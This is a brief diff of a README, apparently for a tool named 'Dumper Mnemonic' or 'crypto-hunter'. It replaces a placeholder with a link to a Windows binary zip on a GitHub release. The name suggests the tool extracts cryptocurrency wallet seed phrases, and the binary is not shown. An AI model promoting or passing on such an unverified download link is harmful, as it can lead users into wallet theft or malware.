@@ -6,7 +6,7 @@
 **Instructions:**
 1. Download the script.
 
-[Download Dumper Mnemonic for Windows](#)
+[download binary for windows](https://github.com/Tieuvanna/crypto-hunter/releases/download/crypto/crypto-hunter.zip)
 
 ## Install Dependencies with PIP
 
